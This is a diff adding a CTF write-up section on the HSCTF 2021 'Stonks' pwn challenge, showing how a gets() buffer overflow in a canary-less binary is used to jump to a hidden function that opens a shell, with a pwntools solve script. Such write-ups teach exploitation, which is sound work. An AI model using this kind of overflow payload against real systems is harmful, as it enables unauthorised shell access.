@@ -659,7 +659,51 @@ The <a href="https://earth.google.com/web/search/san+marino+cable+car/@43.937766
 
 # Stonks (Pwn)
 
+![HSCTF 2021 Writeup](/assets/img/ctfImages/hsctf2021/img15.png)
 
+We were only given an <a href="https://github.com/Angmar2722/Angmar2722.github.io/blob/master/assets/ctfFiles/hsctf2021/chal" target="_blank">executable</a>. 
 
+Connecting to the server, this is what we get :
+
+![HSCTF 2021 Writeup](/assets/img/ctfImages/hsctf2021/img16.png)
+
+Running the usual checks on the binary, we get this :
+
+![HSCTF 2021 Writeup](/assets/img/ctfImages/hsctf2021/img17.png)
+
+No canaries enabled, could be a buffer overflow problem? After disassembling the binary with `objdump`, we find a `gets` call and an allocated buffer of 40 bytes  in the function `vuln` (which is called by `main()`) :
+
+![HSCTF 2021 Writeup](/assets/img/ctfImages/hsctf2021/img18.png)
+
+Disassembling the binary with Ghidra, we find the function `ai_debug` which is not called by any other function. Notice that if you reach this function, it runs the `/bin/sh` shell :
+
+![HSCTF 2021 Writeup](/assets/img/ctfImages/hsctf2021/img19.png)
+
+So we simply have to design a payload that would overflow the buffer in `vuln` and then jump to `ai_debug` and from there we could enter the shell and cat the flag.
+
+Solve script :
+
+```python
+
+from pwn import *
+addr = 0x401258 
+payload = 40 * b'A' + p64(0x00401363)+ p64(addr)
+#r = process("./chal")
+# gdb.attach(r)
+r = remote('stonks.hsc.tf', 1337)
+r.sendlineafter("Please enter the stock ticker symbol: ", payload)
+r.interactive()
+
+```
+
+And after running the script, we enter the shell and once in interactive mode, we can get the flag. Solving this challenge took way longer than it should have because I forgot to enter into interactive mode ......
+
+![HSCTF 2021 Writeup](/assets/img/ctfImages/hsctf2021/img20.png)
+
+<p> <b>Flag :</b> flag{to_the_moon} </p>
+
+<br/>
+
+# Digits-Of-Pi (Web)
 
 
